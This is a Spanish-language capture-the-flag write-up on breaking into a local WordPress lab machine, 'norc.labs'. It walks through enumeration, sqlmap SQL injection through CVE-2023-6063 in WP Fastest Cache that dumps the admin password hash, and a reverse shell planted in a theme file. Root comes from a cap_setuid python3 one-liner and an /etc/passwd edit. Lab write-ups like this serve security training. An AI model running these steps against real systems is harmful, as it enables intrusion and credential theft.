# Enumeracion de Puertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2 -oN nmap
```
```css
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 11:11 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 8c:5c:7b:fe:79:92:7a:f9:85:ec:a5:b9:27:25:db:85 (ECDSA)
|_  256 ba:69:95:e3:df:7e:42:ec:69:ed:74:9e:6b:f6:9a:06 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Did not follow redirect to http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

observo una redireccion al dominio `norc.labs` asi que lo agreo al archivo `/etc/hosts` y accedo al servicio web

![Screenshot From 2024-11-08 13-23-55](https://github.com/user-attachments/assets/b0c82a02-7f68-4506-8778-79d2d54b9e4f)

tras revisar no consigo nada de interes asi que aplico fuzing web

```ruby
feroxbuster -u 'http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png,git -t 200 -d 5 --random-agent --no-state
```
```css
                                                                                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png, git]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 5
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      115l      221w     2570c http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F
301      GET        7l       20w      237c http://norc.labs/wp-includes => http://norc.labs/wp-includes/
200      GET       97l      833w     7401c http://norc.labs/readme.html
200      GET        3l        4w       56c http://norc.labs/robots.txt
301      GET        7l       20w      244c http://norc.labs/wp-includes/images => http://norc.labs/wp-includes/images/
301      GET        7l       20w      240c http://norc.labs/wp-includes/js => http://norc.labs/wp-includes/js/
301      GET        7l       20w      244c http://norc.labs/wp-includes/blocks => http://norc.labs/wp-includes/blocks/
301      GET        7l       20w      250c http://norc.labs/wp-includes/images/media => http://norc.labs/wp-includes/images/media/
301      GET        7l       20w      245c http://norc.labs/wp-includes/widgets => http://norc.labs/wp-includes/widgets/
301      GET        7l       20w      253c http://norc.labs/wp-includes/blocks/comments => http://norc.labs/wp-includes/blocks/comments/
301      GET        7l       20w      250c http://norc.labs/wp-includes/blocks/video => http://norc.labs/wp-includes/blocks/video/
301      GET        7l       20w      252c http://norc.labs/wp-includes/blocks/buttons => http://norc.labs/wp-includes/blocks/buttons/
301      GET        7l       20w      253c http://norc.labs/wp-includes/blocks/archives => http://norc.labs/wp-includes/blocks/archives/
301      GET        7l       20w      251c http://norc.labs/wp-includes/blocks/spacer => http://norc.labs/wp-includes/blocks/spacer/
301      GET        7l       20w      251c http://norc.labs/wp-includes/blocks/search => http://norc.labs/wp-includes/blocks/search/
301      GET        7l       20w      248c http://norc.labs/wp-includes/blocks/rss => http://norc.labs/wp-includes/blocks/rss/
```
por lo visto estoy delante de un `wordpress` intento realizar un escaneo con `wpscan` pero no logro resultados asi que le paso otra herramienta: `nuclei`

```ruby
nuclei -u http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F
```
```ruby
                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.3.5

		projectdiscovery.io

[INF] Current nuclei version: v3.3.5 (latest)
[INF] Current nuclei-templates version: v10.0.3 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 116
[INF] Templates loaded for current scan: 8742
[INF] Executing 8742 signed templates from projectdiscovery/nuclei-templates
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1636 (Reduced 1537 Requests)
[INF] Using Interactsh Server: oast.pro
[CVE-2021-24917] [http] [high] http://norc.labs/wp-admin/options.php?password-protected=login&password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F&redirect_to=http%3A%2F%2F172.17.0.2%2F ["http://norc.labs/ghost-login?redirect_to=%2Fwp-admin%2Fsomething&reauth=1"]
[waf-detect:apachegeneric] [http] [info] http://norc.labs/?password-protected=login&password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F&redirect_to=http%3A%2F%2F172.17.0.2%2F
[wordpress-loginizer:outdated_version] [http] [info] http://norc.labs/wp-content/plugins/loginizer/readme.txt?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F ["1.8.8"] [last_version="1.9.3"]
[wordpress-password-protected:outdated_version] [http] [info] http://norc.labs/wp-content/plugins/password-protected/readme.txt?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F ["2.7.2"] [last_version="2.7.3"]
[wordpress-wp-fastest-cache:outdated_version] [http] [info] http://norc.labs/wp-content/plugins/wp-fastest-cache/readme.txt?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F ["1.2.1"] [last_version="1.3.1"]
[ssh-auth-methods] [javascript] [info] norc.labs:22 ["["publickey","password"]"]
[ssh-password-auth] [javascript] [info] norc.labs:22
[ssh-server-enumeration] [javascript] [info] norc.labs:22 ["SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3"]
[ssh-sha1-hmac-algo] [javascript] [info] norc.labs:22
[openssh-detect] [tcp] [info] norc.labs:22 ["SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3"]
[http-missing-security-headers:permissions-policy] [http] [info] http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F
[http-missing-security-headers:x-frame-options] [http] [info] http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F
[http-missing-security-headers:referrer-policy] [http] [info] http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F
[http-missing-security-headers:x-content-type-options] [http] [info] http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F
[http-missing-security-headers:clear-site-data] [http] [info] http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F
[xss-deprecated-header] [http] [info] http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F ["1; mode=block"]
[apache-detect] [http] [info] http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F ["Apache/2.4.59 (Debian)"]
[wordpress-readme-file] [http] [info] http://norc.labs/readme.html?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F
[cookies-without-httponly] [http] [info] http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F
[cookies-without-secure] [http] [info] http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F
[robots-txt-endpoint] [http] [info] http://norc.labs/robots.txt?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F
[caa-fingerprint] [dns] [info] norc.labs
```

aqui ya me detecta plugin desactualizados y un `CVE`, comienzo chequeando la url `http://norc.labs/ghost-login?redirect_to=%2Fwp-admin%2Fsomething&reauth=1` que esta asociada 
al `CVE` y me lleva al panel de login de `wordpress`

![Screenshot From 2024-11-08 13-28-56](https://github.com/user-attachments/assets/7312a066-1d97-4190-b08d-5541ac6b0b72)

intento con credenciales por defecto pero tras el primer intento, recibo un mensaje de que quedan 2 intentos, esto ya me indica que el panel esta protegido contra
fuerza bruta

![Screenshot From 2024-11-08 13-30-32](https://github.com/user-attachments/assets/aa62733e-5b4f-4f07-8118-9addf7092ced)


asi que comienzo una busqueda de exploit's para alguno de los plugin desactualizados y consigo un `CVE` asociado a uno de los plugin:

```
plugin: {wordpress-wp-fastest-cache} WP Fastest Cache 1.2.1
CVE Asociado: CVE-2023-6063
Vuln: Inyeccion SQL
```

asi que busco un exploit para el `CVE-2023-6063` y me consigo con este repositorio `https://github.com/thesafdari/CVE-2023-6063` con una `POC` 

![Screenshot From 2024-11-08 13-43-26](https://github.com/user-attachments/assets/a12e000a-0771-47d1-b5b5-c05e4b63e135)

asi que lo adapto a mi contexto quedando:

```ruby
sqlmap --dbms=mysql -u "http://norc.labs/wp-login.php" --cookie='wordpress_logged_in=*' --level=2 --dbs --batch
```
```css
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.9#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:45:21 /2024-11-08/

custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
[13:45:22] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
[13:45:22] [WARNING] provided value for parameter 'wordpress_logged_in' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[13:45:22] [INFO] testing connection to the target URL
got a 302 redirect to 'http://norc.labs'. Do you want to follow? [Y/n] Y
[13:45:22] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: Cookie #1* ((custom) HEADER)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: wordpress_logged_in=" AND (SELECT 1947 FROM (SELECT(SLEEP(5)))QSQO) AND "LRNz"="LRNz
---
[13:45:22] [INFO] testing MySQL
[13:45:22] [INFO] confirming MySQL
[13:45:22] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.59
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[13:45:22] [INFO] fetching database names
[13:45:22] [INFO] fetching number of databases
[13:45:22] [INFO] resumed: 2
[13:45:22] [INFO] resumed: information_schema
[13:45:22] [INFO] resumed: wordpress
available databases [2]:
[*] information_schema
[*] wordpress

[13:45:22] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/norc.labs'

[*] ending @ 13:45:22 /2024-11-08/
```

y por lo visto funciona la inyeccion sql, pero demora mucho tiempo asi que busco la estructura de la base de datos `wordpress`


![Screenshot From 2024-11-08 14-18-06](https://github.com/user-attachments/assets/509f7305-b7fd-468a-a9fb-bc12b3979e7c)

y aqui puedo ver que la tabla `wp_users` contiene 3 columnas de interes: `user_login`, `user_pass` y `user_email` asi que dumpeo la informacion directamente

```ruby
sqlmap --dbms=mysql -u "http://norc.labs/wp-login.php" --cookie='wordpress_logged_in=*' --level=2 -D wordpress -T wp_users -C user_login,user_pass,user_email --dump --batch
```
```css
Database: wordpress
Table: wp_users
[1 entry]
+------------+------------------------------------+----------------------------+
| user_login | user_pass                          | user_email                 |
+------------+------------------------------------+----------------------------+
| admin      | $P$BeNShJ/iBpuokTEP2/94.sLS8ejRo6. | admin@oledockers.norc.labs |
+------------+------------------------------------+----------------------------+
```

consigo credenciales, intento crackear el hash pero no logro resultados, al detallar el correo electronico se puede observar un sub-dominio `oledockers.norc.labs`
asi que lo agrego al archivo `/etc/hosts` y accedo por el navegador a chequear si obtengo resultados

![Screenshot From 2024-11-08 14-49-43](https://github.com/user-attachments/assets/90299063-c8c3-4f06-b643-37d9ed318fcf)

consigo la password en texto plano y ahora intento acceder al login de wordpress `http://norc.labs/ghost-login?redirect_to=%2Fwp-login.php%2Fsomething&reauth=1`

![Screenshot From 2024-11-08 15-00-45](https://github.com/user-attachments/assets/8836dc7a-9159-4f95-9cb8-5a3c8dfe62df)


ahora me dirijo al tema `Twenty Twenty-Two` para modificar `functions.php` y cargar una revershell


![Screenshot From 2024-11-08 15-14-41](https://github.com/user-attachments/assets/554de417-5b84-49c2-9bdb-b5f1a61b3bd2)


guardo los cambios y me coloco en escucha por netcat `nc -lnvp 4444`, vuelvo a wordpress y me dirijo a los temas

![Screenshot From 2024-11-08 15-18-58](https://github.com/user-attachments/assets/6d70ddc3-e03f-43ce-b72b-e4e28a9d8b5d)

aqui procedo a activar el tema que edite antes `Twenty Twenty-Two` y al clickar sobre `activate` recibo la conexion en netcat

![Screenshot From 2024-11-08 15-22-02](https://github.com/user-attachments/assets/c0ab82a5-4ce0-4025-8ddc-7de798ed0f99)


# Escalada de Privilegios

### www-data

tratando la terminal

```css
script /dev/null -c bash 
^Z
stty raw -echo; fg
reset xterm
stty rows 38 columns 168
export TERM=xterm
export SHELL=bash

```
chequeo los usuarios y solo existe uno

```ruby
cat /etc/passwd |grep bash
root:x:0:0:root:/root:/bin/bash
kvzlx:x:1000:1000::/home/kvzlx:/bin/bash
```

y puedo acceder al directorio del usuario `kvzlx`, aqui buscando archivos, me consigo con un script oculto


![Screenshot From 2024-11-08 15-33-45](https://github.com/user-attachments/assets/5f387c0d-39a0-453f-b952-c529cce02140)

el archivo `/var/www/html/.wp-encrypted.txt` no existe, en cambio el archivo `/tmp/decoded.txt` si existe pero esta vacio, esto me da a pensar que cada X tiempo se 
ejecuta o ejecutan el script. Pero que hace el script? Primero almacena en la variable `ENC_PASS` el contenido del archivo `/var/www/html/.wp-encrypted.txt`, luego
la variable `DECODED_PASS` almacena el valor de `/var/www/html/.wp-encrypted.txt` decodificandolo desde base64, esa informacion ya decodificada es pasada en texto plano
al archivo `/tmp/decoded.txt` y por ultimo se le pasa a `eval` el valor de la variable `DECODED_PASS` sin tratamiento, lo que podria aprovechar para ejecutar comandos


![Screenshot From 2024-11-08 15-47-50](https://github.com/user-attachments/assets/be2cfd2d-c314-46b7-b048-690403c94bb8)

primero codifique en base64 una revershell y luego la cadena en base64 la almaceno en el archivo `/var/www/html/.wp-encrypted.txt` por ultimo me coloco en escucha
con netcat `nc -lnvp 4445` esperando un rato a ver si se ejecuta el script y despues de un tiempo recibo la conexion como el user `kvzlx`

### kvzlx

buscando en el sistema un buen rato no conseguia nada hasta que busque binarios con la `CAP_SETUID`

```ruby
find / -type f 2>/dev/null|xargs /sbin/getcap -r 2>/dev/null|grep cap_setuid=ep
```

y consegui el binario `/opt/python3`, la escalada ya resulta mas sencilla porque este binario aparece en `gtfobins`

```ruby
/opt/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
ahora soy `root` pero si chequeo el `id` veo lo siguiente

![Screenshot From 2024-11-08 16-37-28](https://github.com/user-attachments/assets/d43c43f8-ee41-4ef0-98e6-8f7c961677ae)


asi que edito el archivo `/etc/passwd` eliminando la `x` en la linea de root y vuelvo al user `kvzlx` para escalar completamente a root

![Screenshot From 2024-11-08 16-40-58](https://github.com/user-attachments/assets/baf308c2-4aeb-4024-94f7-0071777f5e16)












